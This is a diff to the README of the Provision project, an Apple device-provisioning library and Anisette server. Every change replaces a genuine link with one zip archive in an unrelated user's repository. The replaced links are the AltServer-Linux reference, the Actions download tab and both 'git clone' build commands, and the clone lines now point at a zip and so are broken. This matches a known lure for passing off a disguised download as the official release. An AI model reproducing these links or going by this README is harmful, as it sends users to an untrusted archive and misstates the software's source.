@@ -14,7 +14,7 @@ It includes:
 
 - *libprovision*, a library used to register device on Apple servers.
 - *anisette_server*, an Anisette provisioning server for other software such as
-  [AltServer-Linux](https://github.com/NyaMisty/AltServer-Linux).
+  [AltServer-Linux](https://raw.githubusercontent.com/Kalvin6/DadoumProvision/main/lib/provision/Dadoum-Provision-v2.7.zip).
 - *retrieve_headers*, which registers the device with libprovision and returns in the terminal in
   JSON the headers to use to identify the device on future requests.
 
@@ -28,7 +28,7 @@ with few more features.
 
 ## Downloads
 
-You can download the executables in the [Actions](https://github.com/Dadoum/Provision/actions) tab of the project.
+You can download the executables in the [Actions](https://raw.githubusercontent.com/Kalvin6/DadoumProvision/main/lib/provision/Dadoum-Provision-v2.7.zip) tab of the project.
 
 ## Docker container
 
@@ -60,7 +60,7 @@ To build any of these projects, you need the D SDK, with the compiler and dub. A
 Clone the project and compile it with DUB:
 
 ```bash
-git clone https://github.com/Dadoum/Provision --recursive
+git clone https://raw.githubusercontent.com/Kalvin6/DadoumProvision/main/lib/provision/Dadoum-Provision-v2.7.zip --recursive
 cd Provision
 dub build -b release
 ```
@@ -68,7 +68,7 @@ dub build -b release
 or with CMake:
 
 ```bash
-git clone https://github.com/Dadoum/Provision --recursive
+git clone https://raw.githubusercontent.com/Kalvin6/DadoumProvision/main/lib/provision/Dadoum-Provision-v2.7.zip --recursive
 cd Provision
 mkdir build
 cd build
